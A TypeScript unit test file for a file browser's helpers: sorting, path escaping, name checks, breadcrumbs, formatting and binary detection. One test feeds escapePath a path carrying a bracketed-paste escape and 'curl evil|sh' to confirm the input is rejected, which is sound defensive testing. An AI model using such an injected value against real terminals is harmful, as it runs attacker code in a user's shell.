import { describe, expect, it } from 'vitest'

import {
  crumbs,
  decodeText,
  escapePath,
  formatSize,
  formatTime,
  hasNul,
  joinPath,
  validName,
  matches,
  mimeOf,
  parentOf,
  previewKind,
  sortEntries,
  startDir,
  type Entry,
} from '../src/files/fs'

const e = (name: string, type: Entry['type'] = 'file'): Entry => ({ name, type, size: 0, mtime: 0 })

describe('UT-files-1 ordering (AC-9.3)', () => {
  it('folders, files, hidden folders, hidden files; natural and case-insensitive', () => {
    const got = sortEntries([
      e('shot.png'),
      e('.env'),
      e('src', 'dir'),
      e('b.txt'),
      e('.git', 'dir'),
      e('file10'),
      e('Docs', 'dir'),
      e('file2'),
      e('a 1.txt'),
      e('null', 'other'),
    ]).map((x) => x.name)
    expect(got).toEqual(['Docs', 'src', 'a 1.txt', 'b.txt', 'file2', 'file10', 'null', 'shot.png', '.git', '.env'])
  })

  it('the filter ignores case', () => {
    expect(matches('README.md', 'read')).toBe(true)
    expect(matches('README.md', '')).toBe(true)
    expect(matches('README.md', 'x')).toBe(false)
  })
})

describe('UT-files-2 the pasted path (AC-9.7)', () => {
  it('escapes what a shell would split or expand, like a dropped file', () => {
    expect(escapePath('/home/u/shota.png')).toBe('/home/u/shota.png')
    expect(escapePath('/home/u/shot a.png')).toBe('/home/u/shot\\ a.png')
    expect(escapePath("/d/it's.png")).toBe("/d/it\\'s.png")
    expect(escapePath('/d/shot (1).png')).toBe('/d/shot\\ \\(1\\).png')
    expect(escapePath('/d/a[b]&c$x;`y`.png')).toBe('/d/a\\[b\\]\\&c\\$x\\;\\`y\\`.png')
    expect(escapePath('/d/截图 1.png')).toBe('/d/截图\\ 1.png')
    expect(escapePath('/d/a_b-c+d=e,f:g@h%i.png')).toBe('/d/a_b-c+d=e,f:g@h%i.png')
  })

  it('a control character means no paste at all: an ESC could end the bracketed paste, a newline press Enter', () => {
    expect(escapePath('/d/x\x1b[201~\x15curl evil|sh\n')).toBeNull()
    expect(escapePath('/d/line\nbreak')).toBeNull()
    expect(escapePath('/d/del\x7f')).toBeNull()
    expect(escapePath('/d/c1\u009b31m')).toBeNull()
  })

  it('names the agent accepts', () => {
    for (const ok of ['a.txt', '.env', 'shot (1).png', '截图', '..a']) expect(validName(ok), ok).toBe(true)
    for (const bad of ['', '.', '..', 'a/b', '../x', 'x\ny', 'x'.repeat(256), '字'.repeat(86)]) expect(validName(bad), bad).toBe(false)
  })
})

describe('UT-files-3 the path row (AC-9.3)', () => {
  it('~ for home and below, / otherwise', () => {
    expect(crumbs('/home/u/proj/docs', '/home/u')).toEqual([
      { label: '~', path: '/home/u' },
      { label: 'proj', path: '/home/u/proj' },
      { label: 'docs', path: '/home/u/proj/docs' },
    ])
    expect(crumbs('/home/u', '/home/u')).toEqual([{ label: '~', path: '/home/u' }])
    expect(crumbs('/home/user2', '/home/u')).toEqual([
      { label: '/', path: '/' },
      { label: 'home', path: '/home' },
      { label: 'user2', path: '/home/user2' },
    ])
    expect(crumbs('/', null)).toEqual([{ label: '/', path: '/' }])
  })

  it('parents and joins', () => {
    expect(parentOf('/a/b')).toBe('/a')
    expect(parentOf('/a')).toBe('/')
    expect(parentOf('/')).toBe('/')
    expect(joinPath('/', 'etc')).toBe('/etc')
    expect(joinPath('/etc', 'nginx')).toBe('/etc/nginx')
  })
})

describe('UT-files-4 kinds and formatting (AC-9.3, AC-9.5)', () => {
  it('preview kind by extension', () => {
    expect(previewKind('a.PNG')).toBe('image')
    expect(previewKind('a.svg')).toBe('image')
    expect(previewKind('a.mov')).toBe('video')
    expect(previewKind('a.opus')).toBe('audio')
    expect(previewKind('a.pdf')).toBe('none')
    expect(previewKind('a.log')).toBe('text')
    expect(previewKind('Makefile')).toBe('text')
    expect(previewKind('.png')).toBe('text')
    expect(mimeOf('x.jpeg')).toBe('image/jpeg')
    expect(mimeOf('x.bin')).toBe('application/octet-stream')
  })

  it('sizes', () => {
    expect(formatSize(5)).toBe('5 B')
    expect(formatSize(1023)).toBe('1023 B')
    expect(formatSize(4213)).toBe('4.1 KB')
    expect(formatSize(600 * 1024)).toBe('600 KB')
    expect(formatSize(5.5 * 1024 * 1024)).toBe('5.5 MB')
  })

  it('times: HH:MM today, MM-DD this year, YYYY-MM-DD before', () => {
    const now = new Date(2026, 10, 8, 18, 0).getTime()
    expect(formatTime(new Date(2026, 10, 8, 14, 5).getTime(), now)).toBe('14:05')
    expect(formatTime(new Date(2026, 10, 7, 23, 59).getTime(), now)).toBe('11-07')
    expect(formatTime(new Date(2025, 10, 8, 14, 5).getTime(), now)).toBe('2025-11-08')
  })
})

describe('UT-files-5 text or binary (AC-9.5)', () => {
  it('a NUL byte in the first 8 KiB is binary', () => {
    expect(hasNul(new TextEncoder().encode('hello'))).toBe(false)
    expect(hasNul(new Uint8Array([104, 0, 105]))).toBe(true)
    const late = new Uint8Array(9000).fill(65)
    late[8500] = 0
    expect(hasNul(late)).toBe(false)
  })

  it('a tail starts after its first newline', () => {
    const b = new TextEncoder().encode('cut line\nfull 1\nfull 2\n')
    expect(decodeText(b, true)).toBe('full 1\nfull 2\n')
    expect(decodeText(b, false)).toBe('cut line\nfull 1\nfull 2\n')
    expect(decodeText(new TextEncoder().encode('你好'), false)).toBe('你好')
  })
})

describe('UT-files-6 where it opens (AC-9.2)', () => {
  it('back where it was while the cwd is unchanged, else the cwd, home, or /', () => {
    expect(startDir(undefined, '/srv/api', '/home/u')).toBe('/srv/api')
    expect(startDir({ cwd: '/srv/api', dir: '/srv/api/src' }, '/srv/api', '/home/u')).toBe('/srv/api/src')
    expect(startDir({ cwd: '/srv/api', dir: '/srv/api/src' }, '/tmp', '/home/u')).toBe('/tmp')
    expect(startDir(undefined, '', '/home/u')).toBe('/home/u')
    expect(startDir(undefined, undefined, null)).toBe('/')
  })
})
